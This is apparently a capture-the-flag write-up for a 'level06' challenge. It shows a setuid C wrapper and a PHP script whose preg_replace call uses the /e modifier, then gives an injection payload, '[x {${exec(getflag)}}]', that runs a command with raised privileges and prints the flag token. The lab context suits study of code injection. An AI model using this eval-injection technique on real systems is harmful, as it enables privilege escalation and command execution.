\- There is a 32 bits ELF executable: 'level06'
```C
int main(int argc, char **argv, char **envp)
{
	char *esi = strdup(...);
	char *ebx = strdup(...);

	if (argv[1])
	{
		free(esi);
		esi = strdup(argv[1]);

		if (argv[2])
		{
			free(ebx);
			ebx = strdup(argv[2]);
		}
	}

	gid_t gid = getegid();
	uid_t uid = geteuid();
	setresgid(gid, gid, gid);
	setresuid(uid, uid, uid);
	
	char const *command = {"/usr/bin/php", "/home/user/level06/level06.php", esi, ebx, NULL};

	execve("/usr/bin/php", command, envp);

	return 0;
}
```

\- There is also a php script: 'level06.php'
```php
#!/usr/bin/php
<?php

function y($m) { 
	$m = preg_replace("/\./", " x ", $m);  // Replace . by x
	$m = preg_replace("/@/", " y", $m);    // Replace @ by y
	return $m; 
}

function x($y, $z) { 
	$a = file_get_contents($y);     
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);    // replace [x    ] by [y($m)] 
	$a = preg_replace("/\[/", "(", $a);  // Replace [ by (
	$a = preg_replace("/\]/", ")", $a);  // Replace ] by )
	return $a; 
}

$r = x($argv[1], $argv[2]); 
print $r;

?>

Exemple => [x 1.2@3] => (x 1 x 2 y 3) 
```

---

\- Firstly, the C code set the SUID bit to the process and execute the php script.

\- The php script mostly makes replacement on strings with REGEX
- But this script uses a dangerous /REGEX/e, the /e is a modifier that allow to execute code into the regex himself. If it execute a command with higher privilege, i'll be able to get the flag.
  
----

Let's write our payload :
```
[x {${exec(getflag)}}]
```

The first function will replace ..... of  [x .......] by y() function return value and will execute the function exec(getflag) as flag06 and give us the flag:

```bash
> ./level06 /tmp/payload NULL_ARGV
> 
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

Flag: wiok45aaoguiboiki2tuin6ub
```

*wiok45aaoguiboiki2tuin6ub*